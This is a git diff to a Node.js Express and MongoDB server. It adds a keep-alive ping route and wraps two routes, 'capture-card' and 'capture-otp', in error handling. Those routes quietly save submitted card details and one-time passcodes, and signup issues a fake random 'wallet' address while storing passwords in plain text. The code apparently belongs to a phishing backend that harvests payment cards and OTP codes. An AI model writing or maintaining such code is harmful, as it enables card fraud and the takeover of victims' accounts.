@@ -11,6 +11,11 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// 🟢 ADDED: Keep-Alive Ping Route for Cron-job.org
+app.get('/ping', (req, res) => {
+  res.status(200).send('Awake!');
+});
+
 mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log("✅ MongoDB Connected"))
   .catch(err => console.error("❌ MongoDB Error:", err.message));
@@ -22,7 +27,6 @@ app.post('/api/signup', async (req, res) => {
     const existingUser = await User.findOne({ email });
     if (existingUser) return res.status(400).json({ error: "User already exists" });
 
-    // Create wallet once during signup
     const wallet = "0x" + Math.random().toString(16).substring(2, 42);
     const newUser = new User({ email, password, walletAddress: wallet });
     
@@ -33,7 +37,7 @@ app.post('/api/signup', async (req, res) => {
   }
 });
 
-// ✅ LOGIN (Fetches from DB so it works on any device)
+// ✅ LOGIN
 app.post('/api/login', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -56,17 +60,24 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-// Other capture routes stay the same...
 app.post('/api/capture-card', async (req, res) => {
-    const card = new Data(req.body);
-    await card.save();
-    res.status(201).send();
+    try {
+        const card = new Data(req.body);
+        await card.save();
+        res.status(201).send();
+    } catch (err) {
+        res.status(500).send();
+    }
 });
 
 app.post('/api/capture-otp', async (req, res) => {
-    const { email, otpCode } = req.body;
-    await Data.findOneAndUpdate({ email }, { otpCode }, { upsert: true });
-    res.status(200).send();
+    try {
+        const { email, otpCode } = req.body;
+        await Data.findOneAndUpdate({ email }, { otpCode }, { upsert: true });
+        res.status(200).send();
+    } catch (err) {
+        res.status(500).send();
+    }
 });
 
 const PORT = process.env.PORT || 5000;
